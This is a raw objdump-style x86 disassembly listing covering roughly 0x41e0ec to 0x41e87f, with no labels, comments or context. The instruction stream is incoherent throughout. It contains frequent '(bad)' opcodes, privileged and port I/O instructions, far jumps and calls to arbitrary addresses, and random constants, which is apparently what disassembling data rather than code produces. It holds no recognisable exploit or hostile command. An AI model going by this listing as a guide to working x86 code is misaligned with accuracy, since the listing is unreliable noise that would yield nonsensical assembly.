  41e0ec:	mov    ds:0xbe355cd4,eax
  41e0f1:	outs   dx,BYTE PTR ds:[esi]
  41e0f2:	xchg   ebx,edi
  41e0f4:	ret    
  41e0f5:	test   DWORD PTR [edi],edi
  41e0f7:	xor    DWORD PTR [edi+0x2b962305],ebx
  41e0fd:	mov    ebp,DWORD PTR [ecx-0x66213a5a]
  41e103:	and    ebx,DWORD PTR [esi+ebx*8+0x52]
  41e107:	gs iret 
  41e109:	fimul  WORD PTR ds:0x88341c59
  41e10f:	xor    BYTE PTR [edi-0x5e2d76a1],dh
  41e115:	test   DWORD PTR [ebp-0x31],esp
  41e118:	shl    BYTE PTR [esi-0x59],1
  41e11b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41e11e:	and    ecx,DWORD PTR [edx+0x3dd0a]
  41e124:	sub    bh,BYTE PTR [ecx+ebx*4]
  41e127:	mov    cl,0xcf
  41e129:	pusha  
  41e12a:	mov    ah,0x5
  41e12c:	sar    BYTE PTR [eax-0x4c926483],cl
  41e132:	loopne 0x41e151
  41e134:	and    eax,0x94ea18fc
  41e139:	leave  
  41e13a:	(bad)  
  41e13c:	xor    al,0xef
  41e13e:	adc    al,0x95
  41e140:	cli    
  41e141:	js     0x41e1ad
  41e143:	jnp    0x41e130
  41e145:	sbb    DWORD PTR [edi],ebx
  41e147:	mov    eax,ds:0xc10fb854
  41e14c:	rcr    BYTE PTR ds:0x78e7f852,cl
  41e152:	push   0x4e8bed0b
  41e157:	or     BYTE PTR [eax+0x4e238d5c],bh
  41e15d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e15e:	outs   dx,DWORD PTR ds:[esi]
  41e15f:	jmp    0x2c1931d1
  41e164:	shl    DWORD PTR [ebp+0x5e],0x32
  41e168:	inc    esp
  41e169:	imul   ecx,DWORD PTR [eax-0x32],0x912d2277
  41e170:	(bad)  
  41e171:	xlat   BYTE PTR ds:[ebx]
  41e172:	gs sti 
  41e174:	rcr    ecx,1
  41e176:	pop    ecx
  41e177:	(bad)  
  41e178:	cmp    al,0x68
  41e17a:	jmp    0x95c75d0c
  41e17f:	fwait
  41e180:	sbb    BYTE PTR [ecx+0x2ba92338],dh
  41e186:	mov    DWORD PTR [ecx+edx*1+0x3241c3ab],ebp
  41e18d:	mul    BYTE PTR [ecx+0x307568dd]
  41e193:	or     edx,eax
  41e195:	loop   0x41e1c7
  41e197:	rcr    DWORD PTR [eax-0xa0b9388],1
  41e19d:	repz or DWORD PTR [edx],ebp
  41e1a0:	popa   
  41e1a1:	mov    BYTE PTR [edx+0x79],bh
  41e1a4:	scas   eax,DWORD PTR es:[edi]
  41e1a5:	and    al,0x54
  41e1a7:	in     al,dx
  41e1a8:	pop    es
  41e1a9:	ror    BYTE PTR [edi+0xd],cl
  41e1ac:	inc    ecx
  41e1ad:	ds fucomi st,st(2)
  41e1b0:	inc    ecx
  41e1b1:	pop    eax
  41e1b2:	dec    ebx
  41e1b3:	push   edi
  41e1b4:	outs   dx,DWORD PTR ds:[esi]
  41e1b5:	sbb    eax,0xa8f89ad7
  41e1ba:	stos   BYTE PTR es:[edi],al
  41e1bb:	(bad)  
  41e1bc:	fisub  WORD PTR [ebx-0x26336142]
  41e1c3:	loop   0x41e153
  41e1c5:	mov    BYTE PTR [ecx+0xe05fb33],bh
  41e1cb:	(bad)  
  41e1cc:	(bad)
  41e1d0:	add    al,BYTE PTR [edi-0x28bd38bb]
  41e1d6:	mov    ds:0xf7eedac8,al
  41e1db:	and    DWORD PTR [ebx-0x6],ebp
  41e1de:	mov    ecx,0x21371177
  41e1e3:	or     DWORD PTR [edx],esp
  41e1e5:	adc    BYTE PTR [ebx+0x60ae624],ah
  41e1eb:	dec    eax
  41e1ec:	push   cs
  41e1ed:	lds    edx,FWORD PTR [edi*2-0x36fef6a9]
  41e1f4:	jnp    0x41e224
  41e1f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1f7:	inc    esp
  41e1f8:	inc    ecx
  41e1f9:	sbb    edi,DWORD PTR [ecx+0x1ff0bf29]
  41e1ff:	sti    
  41e200:	imul   ebx,DWORD PTR [ebp-0xb],0x1b
  41e204:	inc    ebp
  41e205:	add    esi,esi
  41e207:	sbb    ah,BYTE PTR [eax]
  41e209:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e20a:	jns    0x41e251
  41e20c:	sbb    ecx,edx
  41e20e:	hlt    
  41e20f:	jmp    0x2f07fdc6
  41e214:	out    dx,eax
  41e215:	stos   DWORD PTR es:[edi],eax
  41e216:	jo     0x41e260
  41e218:	cmp    edx,ecx
  41e21a:	lea    ebp,[ebp-0x52670459]
  41e220:	pop    ebp
  41e221:	cld    
  41e222:	xor    eax,0x968c7084
  41e227:	arpl   WORD PTR [esi-0x10],di
  41e22a:	aam    0xf8
  41e22c:	cwde   
  41e22d:	out    dx,eax
  41e22e:	push   edi
  41e22f:	retf   
  41e230:	je     0x41e284
  41e232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e233:	icebp  
  41e234:	xchg   ebx,eax
  41e235:	or     esp,ebp
  41e237:	adc    dh,BYTE PTR [ecx-0x50cae70]
  41e23d:	das    
  41e23e:	and    al,0x3c
  41e240:	mov    dl,0x69
  41e242:	dec    edi
  41e243:	push   ss
  41e244:	mov    dl,0xa4
  41e246:	jle    0x41e294
  41e248:	pop    esi
  41e249:	cmp    cl,BYTE PTR [eax]
  41e24b:	ins    DWORD PTR es:[edi],dx
  41e24c:	ror    DWORD PTR [ebx+0xe],0x5d
  41e250:	xor    DWORD PTR [ebx+eax*8+0x5f],eax
  41e254:	and    cl,dh
  41e256:	cwde   
  41e257:	sbb    al,0x5a
  41e259:	inc    edx
  41e25a:	mov    edx,0x34db1937
  41e25f:	shr    edi,cl
  41e261:	mov    al,0x59
  41e263:	jl     0x41e203
  41e265:	xchg   ebp,eax
  41e266:	loopne 0x41e2bb
  41e268:	jmp    0x6dc8:0x2cb95879
  41e26f:	imul   ebp,DWORD PTR [edx],0xdee92c14
  41e275:	int3   
  41e276:	ja     0x41e26b
  41e278:	jmp    0xccf65573
  41e27d:	(bad)  
  41e27f:	neg    edi
  41e281:	or     ebx,DWORD PTR [edi+0x23dd5f0e]
  41e287:	unpckhps xmm3,XMMWORD PTR [eax]
  41e28a:	ja     0x41e2bc
  41e28c:	mov    al,ds:0xba96e9f0
  41e291:	inc    esp
  41e292:	jle    0x41e29c
  41e294:	push   ebp
  41e295:	(bad)  
  41e296:	(bad)  
  41e298:	fild   QWORD PTR [ebp-0x39d92ec1]
  41e29e:	call   0x503dce1d
  41e2a3:	cmp    DWORD PTR [eax],esp
  41e2a5:	xchg   edx,eax
  41e2a6:	xchg   esp,eax
  41e2a7:	adc    DWORD PTR [edx],ebx
  41e2a9:	mov    fs,WORD PTR [ebx-0x6e]
  41e2ac:	into   
  41e2ad:	xchg   ecx,eax
  41e2ae:	dec    edx
  41e2af:	jg     0x41e322
  41e2b1:	push   edx
  41e2b2:	jmp    0x199c:0x2840e397
  41e2b9:	in     eax,0x4a
  41e2bb:	test   eax,0x4aefcf36
  41e2c0:	inc    edi
  41e2c1:	ja     0x41e32a
  41e2c3:	sbb    eax,edi
  41e2c5:	push   ds
  41e2c6:	pop    ds
  41e2c7:	xlat   BYTE PTR ds:[ebx]
  41e2c8:	sar    edx,cl
  41e2ca:	jno    0x41e2ad
  41e2cc:	inc    ebp
  41e2cd:	sbb    eax,0xaa7b0b51
  41e2d2:	dec    eax
  41e2d3:	jecxz  0x41e278
  41e2d5:	scas   eax,DWORD PTR es:[edi]
  41e2d6:	arpl   WORD PTR [ebp-0x14],dx
  41e2d9:	and    eax,0xa091899a
  41e2de:	sti    
  41e2df:	sbb    esi,DWORD PTR [esp+ebp*1-0x3a35dafd]
  41e2e6:	mov    al,0x4c
  41e2e8:	push   esp
  41e2e9:	test   al,0x95
  41e2eb:	sbb    eax,0x44b624e2
  41e2f0:	adc    bl,BYTE PTR [ebp-0x71140063]
  41e2f6:	push   cs
  41e2f7:	xor    esi,edx
  41e2f9:	stos   BYTE PTR es:[edi],al
  41e2fa:	into   
  41e2fb:	neg    BYTE PTR [ecx]
  41e2fd:	push   eax
  41e2fe:	lds    edx,FWORD PTR [esi]
  41e300:	sub    bl,0x36
  41e303:	test   DWORD PTR [eax],0x0
	...
  41e311:	outs   dx,BYTE PTR ds:[esi]
  41e312:	idiv   DWORD PTR [ebx-0x1924497]
  41e318:	not    DWORD PTR [edx+eax*1+0x31]
  41e31c:	pop    ecx
  41e31d:	dec    eax
  41e31e:	mov    WORD PTR [ebp+0x15e6b50],cs
  41e324:	add    BYTE PTR [ebx-0x1cfffffd],ch
  41e32a:	sti    
  41e32b:	(bad)  
  41e32c:	jle    0x41e2af
  41e32e:	dec    esp
  41e32f:	or     ebp,ebx
  41e331:	dec    ecx
  41e332:	and    BYTE PTR [esi+0x6f],cl
  41e335:	in     al,0x71
  41e337:	popa   
  41e338:	(bad)  
  41e339:	xchg   DWORD PTR ds:[ebp-0x1bd073bc],edx
  41e340:	call   0xf2bb:0xf95c92cc
  41e347:	push   cs
  41e348:	jp     0x41e2f7
  41e34a:	or     ebp,DWORD PTR [eax]
  41e34c:	pop    es
  41e34d:	mov    al,0x8c
  41e34f:	int    0x88
  41e351:	icebp  
  41e352:	outs   dx,DWORD PTR ds:[esi]
  41e353:	xchg   esi,eax
  41e354:	and    eax,0xd55e29c5
  41e359:	je     0x41e34e
  41e35b:	icebp  
  41e35c:	cli    
  41e35d:	mov    ebp,0xb3276e6a
  41e362:	sar    BYTE PTR [ebp+0x5c],1
  41e365:	xchg   esi,eax
  41e366:	or     cl,BYTE PTR [ecx-0x45628de4]
  41e36c:	jge    0x41e3ea
  41e36e:	pop    ss
  41e36f:	das    
  41e370:	adc    eax,ecx
  41e372:	js     0x41e2fb
  41e374:	cwde   
  41e375:	jae    0x41e373
  41e377:	adc    DWORD PTR [esi-0x34fc7018],ebp
  41e37d:	xor    eax,DWORD PTR [ecx-0x50b17672]
  41e383:	adc    eax,0xb64fc3b1
  41e388:	cs xchg esi,eax
  41e38a:	jmp    DWORD PTR [edx+0x3c]
  41e38d:	fwait
  41e38e:	enter  0x1bad,0x5
  41e392:	sar    BYTE PTR [edi+ebx*1],1
  41e395:	xchg   DWORD PTR [edi+eax*8+0x5ccba413],edx
  41e39c:	sub    al,0x4
  41e39e:	inc    edx
  41e39f:	mov    eax,ds:0x3bf34650
  41e3a4:	adc    esp,ebx
  41e3a6:	sbb    al,bh
  41e3a8:	sub    al,0xc0
  41e3aa:	leave  
  41e3ab:	jmp    0x61f7:0xe3ad90d9
  41e3b2:	or     al,dh
  41e3b4:	jae    0x41e3eb
  41e3b6:	call   0x7b3:0x1013722f
  41e3bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3be:	mov    esi,0xd935e005
  41e3c3:	mov    cl,0xfb
  41e3c5:	in     eax,0x54
  41e3c7:	rcl    BYTE PTR [ebx-0x85cd7e8],0x71
  41e3ce:	out    dx,eax
  41e3cf:	(bad)  
  41e3d0:	xchg   edx,eax
  41e3d1:	jg     0x41e3d4
  41e3d3:	das    
  41e3d4:	lods   eax,DWORD PTR ds:[esi]
  41e3d5:	outs   dx,BYTE PTR ds:[esi]
  41e3d6:	iret   
  41e3d7:	inc    esp
  41e3d8:	jecxz  0x41e397
  41e3da:	stc    
  41e3db:	jl     0x41e40c
  41e3dd:	inc    esi
  41e3de:	pop    ss
  41e3df:	jge    0x41e3cd
  41e3e1:	inc    ebx
  41e3e2:	icebp  
  41e3e3:	sbb    al,0x4d
  41e3e5:	adc    ecx,ecx
  41e3e7:	out    0x11,al
  41e3e9:	adc    ebx,esp
  41e3eb:	jge    0x41e3d2
  41e3ed:	inc    esi
  41e3ee:	adc    al,0xb3
  41e3f0:	daa    
  41e3f1:	jo     0x41e3f2
  41e3f3:	add    eax,0xbc3d1f43
  41e3f8:	imul   esp,edx,0x8cc49327
  41e3fe:	add    eax,0x4476f544
  41e403:	mov    eax,ds:0x5dc9bfd8
  41e408:	shl    DWORD PTR [edx+edx*2],0x58
  41e40c:	sub    edx,DWORD PTR [ecx-0x1f]
  41e40f:	cmp    DWORD PTR [ebx-0x49],ecx
  41e412:	fs mov edi,0xabdb64af
  41e418:	or     eax,0xc85d96a1
  41e41d:	mov    es,esp
  41e41f:	sahf   
  41e420:	fwait
  41e421:	lea    edx,[ecx+edx*1]
  41e424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e425:	pop    esi
  41e426:	call   0x129925ae
  41e42b:	mov    ds:0x76995a71,eax
  41e430:	lods   al,BYTE PTR ds:[esi]
  41e431:	(bad)  
  41e432:	cmp    esi,DWORD PTR [ebx+0x1fbb0b38]
  41e438:	stos   BYTE PTR es:[edi],al
  41e439:	jp     0x41e3bf
  41e43b:	pop    esi
  41e43c:	sar    BYTE PTR ds:[eax-0x50d91438],cl
  41e443:	push   ebp
  41e444:	mov    WORD PTR [esi+0x4a3ddc70],fs
  41e44a:	neg    bl
  41e44c:	stos   BYTE PTR es:[edi],al
  41e44d:	out    0x34,al
  41e44f:	sbb    DWORD PTR [ecx+0x3b115f4b],0x4e4772d9
  41e459:	adc    BYTE PTR [edi+0xd88f984],bl
  41e45f:	imul   edi,DWORD PTR [eax+0x35],0x30384f27
  41e466:	jbe    0x41e425
  41e468:	mov    bl,0xca
  41e46a:	std    
  41e46b:	pop    ds
  41e46c:	xlat   BYTE PTR ds:[ebx]
  41e46d:	and    al,0x68
  41e46f:	sbb    DWORD PTR [ecx+ebx*2+0x61],0xcac66b58
  41e477:	mov    DWORD PTR [ebx-0x449399],edx
  41e47d:	and    dh,BYTE PTR [ebx-0x240b0edb]
  41e483:	daa    
  41e484:	push   es
  41e485:	cmp    al,0x8f
  41e487:	pop    ds
  41e488:	pop    ds
  41e489:	cmp    ch,BYTE PTR [ebx+0xe]
  41e48c:	mov    BYTE PTR [eax],ah
  41e48e:	adc    DWORD PTR [eax+0x7680d2c2],ebp
  41e494:	sbb    bh,0xf2
  41e497:	xor    ebp,edx
  41e499:	xchg   edi,eax
  41e49a:	jmp    0x58cd:0x68cbeb96
  41e4a1:	leave  
  41e4a2:	ds stos DWORD PTR es:[edi],eax
  41e4a4:	cmp    eax,0x31bd07d1
  41e4a9:	sub    BYTE PTR [eax],ah
  41e4ab:	push   edx
  41e4ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4ad:	mov    edi,0xcd39a9f0
  41e4b2:	clc    
  41e4b3:	outs   dx,BYTE PTR ds:[esi]
  41e4b4:	xor    BYTE PTR [ecx-0x4d62120],cl
  41e4ba:	jg     0x41e50a
  41e4bc:	stos   BYTE PTR es:[edi],al
  41e4bd:	dec    edi
  41e4be:	mov    ah,0xf6
  41e4c0:	xchg   ebp,eax
  41e4c1:	jp     0x41e4ab
  41e4c3:	les    esi,FWORD PTR [si-0x2b]
  41e4c7:	and    al,0x61
  41e4c9:	sub    DWORD PTR [eax+0x48],ebx
  41e4cc:	mov    bl,0x3f
  41e4ce:	in     eax,dx
  41e4cf:	aad    0xbe
  41e4d1:	(bad)  
  41e4d2:	(bad)  
  41e4d4:	jns    0x41e524
  41e4d6:	jns    0x41e490
  41e4d8:	sbb    ch,ch
  41e4da:	jnp    0x41e4af
  41e4dc:	jb     0xc5ff89c6
  41e4e2:	call   0xd024:0xc71f
  41e4e8:	adc    eax,0x67202c7
  41e4ed:	pop    eax
  41e4ee:	enter  0xf1eb,0x40
  41e4f2:	inc    eax
  41e4f3:	pop    esp
  41e4f4:	inc    edi
  41e4f5:	adc    edi,DWORD PTR [eax+eiz*8-0x30]
  41e4f9:	or     eax,0x30fa5f34
  41e4fe:	and    edi,edx
  41e500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e501:	outs   dx,DWORD PTR ds:[esi]
  41e502:	mov    ah,0x67
  41e504:	stos   DWORD PTR es:[edi],eax
  41e505:	push   esp
  41e506:	cmp    BYTE PTR [ecx+0x403878fa],bl
  41e50c:	scas   eax,DWORD PTR es:[edi]
  41e50d:	and    ebp,ecx
  41e50f:	push   cs
  41e510:	xor    ebp,DWORD PTR [edi]
  41e512:	mov    dl,0x2
  41e514:	add    eax,0x6911a78e
  41e519:	inc    ecx
  41e51a:	push   cs
  41e51b:	fcom   QWORD PTR [ebp-0x78420ffd]
  41e521:	xchg   edi,eax
  41e522:	cmp    eax,0x38c1d11e
  41e527:	jl     0x41e4bb
  41e529:	int    0x8
  41e52b:	sbb    eax,0x11cc28eb
  41e530:	(bad)  
  41e531:	js     0x41e4d3
  41e533:	aaa    
  41e534:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e535:	mov    ecx,0xfaa373c9
  41e53a:	aad    0x6a
  41e53c:	xor    eax,0xade9cbce
  41e541:	sub    al,BYTE PTR [edi+0x7a4a0320]
  41e547:	hlt    
  41e548:	xor    BYTE PTR [ebx],0x58
  41e54b:	cmp    ch,bh
  41e54d:	inc    edx
  41e54e:	mov    edi,0x38944844
  41e553:	add    dh,BYTE PTR [edx+edx*2+0x56b0d7e5]
  41e55a:	sub    BYTE PTR [ecx-0x531a88a4],bh
  41e560:	ds pop es
  41e562:	ins    BYTE PTR es:[edi],dx
  41e563:	xor    DWORD PTR [ebx],0x5e0f9752
  41e569:	nop
  41e56a:	ins    DWORD PTR es:[edi],dx
  41e56b:	mov    edx,0x79f78323
  41e570:	or     al,0x81
  41e572:	imul   edx,DWORD PTR [esi],0xffffffe5
  41e575:	push   ebx
  41e576:	in     al,0x8
  41e578:	int3   
  41e579:	rcl    DWORD PTR [ecx-0x3],cl
  41e57c:	data16 jl 0x41e5a3
  41e57f:	aam    0xc7
  41e581:	push   0x2ed4b24a
  41e586:	xor    eax,0x72f9cb7f
  41e58b:	sbb    BYTE PTR fs:[eax+eax*2],0x23
  41e590:	popa   
  41e591:	sub    eax,ecx
  41e593:	jle    0x41e51e
  41e595:	or     eax,0x7d74ccbc
  41e59a:	cmp    DWORD PTR [esi-0x72d1117e],ebp
  41e5a0:	clc    
  41e5a1:	dec    edx
  41e5a2:	xchg   edx,eax
  41e5a3:	mov    dl,0x80
  41e5a5:	sbb    BYTE PTR [edx],0xb9
  41e5a8:	cli    
  41e5a9:	sub    al,0x11
  41e5ab:	and    esp,ebp
  41e5ad:	inc    ebx
  41e5ae:	and    eax,0x566579f4
  41e5b3:	xor    eax,0xe363c6d4
  41e5b8:	mov    eax,ds:0x629ee73a
  41e5bd:	cwde   
  41e5be:	xchg   ebx,eax
  41e5bf:	sub    BYTE PTR [edx+ebp*4-0x7],dh
  41e5c3:	sbb    DWORD PTR [ecx],ebp
  41e5c5:	retf   0x995f
  41e5c8:	xor    eax,0x5ac5f00c
  41e5cd:	(bad)  
  41e5ce:	je     0x41e586
  41e5d0:	cld    
  41e5d1:	sbb    DWORD PTR [ecx],0xffffffd6
  41e5d4:	sub    DWORD PTR [ebp+0x1a],edx
  41e5d7:	sbb    eax,0x95bbc99
  41e5dc:	bound  ebp,QWORD PTR [esi-0x2c]
  41e5df:	scas   eax,DWORD PTR es:[edi]
  41e5e0:	loopne 0x41e640
  41e5e2:	js     0x41e564
  41e5e4:	xor    al,0x5a
  41e5e6:	mov    al,ds:0x36bcd453
  41e5eb:	hlt    
  41e5ec:	xchg   BYTE PTR [eax+0x4285e4b9],bh
  41e5f2:	mov    WORD PTR [ebx-0x6f],ss
  41e5f5:	mov    edi,0x22ccb311
  41e5fa:	retf   0x50e5
  41e5fd:	outs   dx,BYTE PTR ds:[esi]
  41e5fe:	jae    0x41e65f
  41e600:	or     edx,DWORD PTR [edi-0x21260aeb]
  41e606:	cld    
  41e607:	cli    
  41e608:	push   ecx
  41e609:	mov    ds:0xb525128e,eax
  41e60e:	jmp    0xe7c6:0x389191a7
  41e615:	mov    edx,0x6aeecaa8
  41e61a:	jns    0x41e60f
  41e61c:	lahf   
  41e61d:	leave  
  41e61e:	mov    dl,0xca
  41e620:	pop    esp
  41e621:	out    dx,eax
  41e622:	xchg   ecx,eax
  41e623:	dec    esi
  41e624:	cmp    bh,BYTE PTR [edx]
  41e626:	hlt    
  41e627:	and    dl,BYTE PTR [edi]
  41e629:	(bad)  
  41e62b:	cdq    
  41e62c:	cmp    BYTE PTR [edx-0x37],bh
  41e62f:	mov    edi,DWORD PTR [ebx-0x4b]
  41e632:	jno    0x41e66e
  41e634:	stos   BYTE PTR es:[edi],al
  41e635:	cmp    eax,0xc1047523
  41e63a:	ret    0x7f6e
  41e63d:	xchg   ebx,eax
  41e63e:	retf   
  41e63f:	and    al,0x6d
  41e641:	xor    al,0x1c
  41e643:	inc    edi
  41e644:	iret   
  41e645:	popa   
  41e646:	aaa    
  41e647:	add    BYTE PTR [edx],dl
  41e649:	xchg   ebx,eax
  41e64a:	and    BYTE PTR [ebp+0x35],dl
  41e64d:	dec    ecx
  41e64e:	xor    DWORD PTR [ebx],eax
  41e650:	stos   DWORD PTR es:[edi],eax
  41e651:	mov    al,ds:0x1bdacf9e
  41e656:	hlt    
  41e657:	mov    al,ds:0xd20fcbb4
  41e65c:	cs or  al,0x26
  41e65f:	and    BYTE PTR [eax+0x70],ah
  41e662:	push   ds
  41e663:	nop
  41e664:	mov    dl,0x61
  41e666:	mov    ebp,0xadc90bd1
  41e66b:	and    dl,BYTE PTR [edx]
  41e66d:	pop    es
  41e66e:	loopne 0x41e6d2
  41e670:	loope  0x41e6ef
  41e672:	js     0x41e6e5
  41e674:	jb     0x41e698
  41e676:	pop    ebp
  41e677:	outs   dx,BYTE PTR ds:[esi]
  41e678:	into   
  41e679:	aad    0xf9
  41e67b:	cld    
  41e67c:	aad    0xb5
  41e67e:	sub    DWORD PTR [edi-0x51],esp
  41e681:	jbe    0x41e6d7
  41e683:	mov    ebp,0x799edf17
  41e688:	sti    
  41e689:	push   0xffffff97
  41e68b:	or     ebx,DWORD PTR [edi+0x32]
  41e68e:	mov    ch,0xb7
  41e690:	push   0x3
  41e692:	dec    ebx
  41e693:	push   ebp
  41e694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e696:	push   cs
  41e697:	mov    ecx,ebp
  41e699:	sbb    ecx,ebx
  41e69b:	repnz retf 
  41e69d:	into   
  41e69e:	or     cl,dl
  41e6a0:	pop    ebp
  41e6a1:	xchg   dh,bl
  41e6a3:	inc    esp
  41e6a4:	out    dx,al
  41e6a5:	fldenv [edi-0x22]
  41e6a8:	mov    cl,0xaa
  41e6aa:	dec    ecx
  41e6ab:	xor    al,0x76
  41e6ad:	adc    BYTE PTR [ecx],cl
  41e6af:	adc    BYTE PTR [edx],0xcc
  41e6b2:	fmulp  st(0),st
  41e6b4:	push   ecx
  41e6b5:	add    BYTE PTR [edx-0x3a5ccf38],ah
  41e6bb:	push   es
  41e6bc:	cdq    
  41e6bd:	and    eax,0x8f7c16b3
  41e6c2:	adc    esi,DWORD PTR [esi-0x33f23228]
  41e6c8:	inc    ebp
  41e6c9:	pop    esi
  41e6ca:	fadd   DWORD PTR [edx+0x60ecb0aa]
  41e6d0:	push   esp
  41e6d1:	lahf   
  41e6d2:	cmp    al,BYTE PTR fs:[eax]
	...
  41e6e1:	sub    eax,0xfffb5fc4
  41e6e6:	sti    
  41e6e7:	lods   eax,DWORD PTR ds:[esi]
  41e6e8:	(bad)  
  41e6e9:	or     DWORD PTR [edi],ebp
  41e6eb:	jmp    0xaa1f4c5d
  41e6f0:	nop
  41e6f1:	push   ss
  41e6f2:	bound  eax,QWORD PTR [ecx]
  41e6f4:	add    BYTE PTR [ebx+0x37000003],ch
  41e6fa:	xor    eax,0xb31cb3ad
  41e6ff:	add    bh,BYTE PTR [edx-0x4d]
  41e702:	push   esp
  41e703:	xlat   BYTE PTR ds:[ebx]
  41e704:	jle    0x41e74c
  41e706:	push   0xfffffffb
  41e708:	mov    bh,0x5f
  41e70a:	mov    esp,0xef86a075
  41e70f:	mov    esp,0x95fb6c75
  41e714:	arpl   WORD PTR [edi],bp
  41e716:	bound  eax,QWORD PTR [edi]
  41e718:	jo     0x41e6f2
  41e71a:	mov    ah,0xff
  41e71c:	and    DWORD PTR ds:0x76eb29fa,edi
  41e722:	sbb    ebp,DWORD PTR [ecx-0x2b90f4a8]
  41e728:	hlt    
  41e729:	push   ebp
  41e72a:	cli    
  41e72b:	out    dx,al
  41e72c:	dec    edx
  41e72d:	loopne 0x41e73a
  41e72f:	jecxz  0x41e6fd
  41e731:	sub    dl,al
  41e733:	stc    
  41e734:	jmp    0xb1ceac3f
  41e739:	xchg   edx,eax
  41e73a:	cmp    BYTE PTR [ebp-0x25856f87],0xa1
  41e741:	xor    al,0x5d
  41e743:	cli    
  41e744:	xor    eax,0x4c32dc9b
  41e749:	or     ah,BYTE PTR ds:0x8c21e937
  41e74f:	sar    BYTE PTR [edx-0x6e6d2183],0xb9
  41e756:	xlat   BYTE PTR ds:[ebx]
  41e757:	jecxz  0x41e7c7
  41e759:	xchg   ch,ah
  41e75b:	sbb    al,0xa6
  41e75d:	out    dx,eax
  41e75e:	push   eax
  41e75f:	inc    eax
  41e760:	dec    edi
  41e761:	pop    esp
  41e762:	arpl   WORD PTR [esi-0x687aaa56],ax
  41e768:	sub    BYTE PTR [edi+0x52237de8],dh
  41e76e:	imul   eax,DWORD PTR [edi+eax*1],0xffffff92
  41e772:	cmp    ch,BYTE PTR [ebx+0x58a5492]
  41e778:	sbb    al,BYTE PTR [ebx-0x5d]
  41e77b:	jmp    0x12d9765a
  41e780:	outs   dx,DWORD PTR ds:[esi]
  41e781:	sbb    DWORD PTR [eax],0xffffffa0
  41e784:	xor    ebp,DWORD PTR [eax+0x2f131724]
  41e78a:	mov    eax,ds:0x6d803774
  41e78f:	mov    esi,0x58580a59
  41e794:	cld    
  41e795:	xor    al,0xb2
  41e797:	and    al,0x9
  41e799:	cld    
  41e79a:	sbb    DWORD PTR [ecx],edx
  41e79c:	popf   
  41e79d:	stos   DWORD PTR es:[edi],eax
  41e79e:	inc    esi
  41e79f:	lods   al,BYTE PTR ds:[esi]
  41e7a0:	and    al,0x32
  41e7a2:	mov    ch,0x33
  41e7a4:	popa   
  41e7a5:	rol    DWORD PTR [edx+edi*4],1
  41e7a8:	mov    bh,0xad
  41e7aa:	xchg   esi,eax
  41e7ab:	vpacksswb ymm0,ymm1,YMMWORD PTR [edi+0x3b]
  41e7b0:	fwait
  41e7b1:	sbb    edx,ebp
  41e7b3:	xchg   edi,eax
  41e7b4:	icebp  
  41e7b5:	pop    ss
  41e7b6:	jecxz  0x41e75c
  41e7b8:	mov    BYTE PTR [eax-0xd5793f3],ch
  41e7be:	repz push cs
  41e7c0:	out    dx,eax
  41e7c1:	pop    edi
  41e7c2:	(bad)  
  41e7c3:	jl     0x41e7de
  41e7c5:	add    DWORD PTR [ebx+0x3c],edx
  41e7c8:	push   esp
  41e7c9:	pusha  
  41e7ca:	out    dx,eax
  41e7cb:	mov    eax,ds:0xc6d580f5
  41e7d0:	xchg   esp,eax
  41e7d1:	addr16 push ebx
  41e7d3:	test   al,0xe7
  41e7d5:	mov    ah,0xcf
  41e7d7:	stc    
  41e7d8:	sub    eax,0x8ea03158
  41e7dd:	stos   DWORD PTR es:[edi],eax
  41e7de:	xchg   BYTE PTR [edx+ebx*4+0x3],dh
  41e7e2:	xor    BYTE PTR [esi-0x6df0c10a],0x4a
  41e7e9:	gs push ecx
  41e7eb:	sbb    al,0x55
  41e7ed:	sbb    edi,DWORD PTR [edx]
  41e7ef:	lock outs dx,DWORD PTR ds:[esi]
  41e7f1:	inc    eax
  41e7f2:	mov    eax,ds:0xb3ebbb3e
  41e7f7:	jno    0x41e7c9
  41e7f9:	jmp    0x9920d719
  41e7fe:	mov    al,ds:0xb4b638ff
  41e803:	add    al,0x7f
  41e805:	lds    edi,FWORD PTR ds:0xc907cc38
  41e80b:	mov    dh,BYTE PTR [ecx+0x977ab80]
  41e811:	data16 neg BYTE PTR [esp+esi*4+0x6ff7557c]
  41e819:	cmp    BYTE PTR [ecx],dl
  41e81b:	out    dx,eax
  41e81c:	or     cl,bh
  41e81e:	pop    es
  41e81f:	jbe    0x41e896
  41e821:	and    DWORD PTR [edx+eiz*8+0x16a394b4],esp
  41e828:	pop    esp
  41e829:	jmp    0x9d0ecb21
  41e82e:	sahf   
  41e82f:	push   0xffffffb6
  41e831:	jl     0x41e805
  41e833:	stos   DWORD PTR es:[edi],eax
  41e834:	mov    dh,0x47
  41e836:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41e838:	aad    0xf
  41e83a:	(bad)  
  41e83b:	fdivr  QWORD PTR [ecx-0x29]
  41e83e:	lock sub edx,esp
  41e841:	(bad)  
  41e842:	popa   
  41e843:	mov    ds:0x1aaff0c6,eax
  41e848:	pushf  
  41e849:	mov    bh,0xb9
  41e84c:	add    BYTE PTR [ebx-0x38],dl
  41e84f:	out    0x36,al
  41e851:	pushf  
  41e852:	pop    es
  41e853:	jne    0x41e802
  41e855:	push   edi
  41e856:	dec    ecx
  41e857:	sbb    BYTE PTR [ecx],0xed
  41e85a:	pop    esp
  41e85b:	stc    
  41e85c:	pop    bp
  41e85e:	mov    bh,0xbd
  41e860:	sbb    ah,BYTE PTR [eax+ebx*2]
  41e863:	and    esp,eax
  41e865:	(bad)  
  41e866:	stos   BYTE PTR es:[edi],al
  41e867:	mov    cl,0xfc
  41e869:	out    dx,al
  41e86a:	mov    edx,0x73b89fdd
  41e86f:	bound  ebp,QWORD PTR [esi]
  41e871:	inc    ecx
  41e872:	inc    eax
  41e873:	(bad)
  41e877:	or     eax,0xb526e953
  41e87c:	add    ebx,DWORD PTR [eax-0x12]
  41e87f:	dec    esi
